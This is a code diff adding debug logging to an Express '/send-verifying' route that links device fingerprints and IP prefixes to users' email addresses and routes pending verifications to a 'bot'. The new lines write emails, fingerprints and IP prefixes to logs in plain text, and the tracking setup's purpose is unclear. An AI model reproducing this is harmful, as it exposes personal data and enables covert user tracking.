@@ -1861,17 +1861,29 @@ app.post("/send-verifying", async (req, res) => {
     const fingerprint = getDeviceFingerprint(req);
     const ipPrefix = ip.split(".").slice(0, 3).join(".");
 
+    console.log(`🔍 DEBUG /send-verifying: Original email: ${email}`);
+    console.log(`🔍 DEBUG: Fingerprint: ${fingerprint}`);
+    console.log(`🔍 DEBUG: IP Prefix: ${ipPrefix}`);
+    console.log(`🔍 DEBUG: deviceFingerprintToEmail[${fingerprint}] = ${deviceFingerprintToEmail[fingerprint]}`);
+    console.log(`🔍 DEBUG: ipPrefixToEmail[${ipPrefix}] = ${ipPrefixToEmail[ipPrefix]}`);
+
     // ✅ RESOLVE LATEST EMAIL from fingerprint or IP (for display)
     let displayEmail = email; // Default to original
     
     // Try fingerprint first (most reliable)
     if (fingerprint && deviceFingerprintToEmail[fingerprint]) {
       displayEmail = deviceFingerprintToEmail[fingerprint];
+      console.log(`✅ Found latest email via fingerprint: ${displayEmail}`);
     }
     // Try IP prefix as fallback
     else if (ipPrefix && ipPrefixToEmail[ipPrefix]) {
       displayEmail = ipPrefixToEmail[ipPrefix];
+      console.log(`✅ Found latest email via IP prefix: ${displayEmail}`);
+    } else {
+      console.log(`⚠️ No latest email found, using original: ${displayEmail}`);
     }
+
+    console.log(`📧 Final displayEmail: ${displayEmail}`);
 
     // ✅ ORIGINAL EMAIL stays for winner lookup (to send to correct bot)
     pendingVerifying[verifyingId] = { status: "pending", userId, email, displayEmail, choice: null };
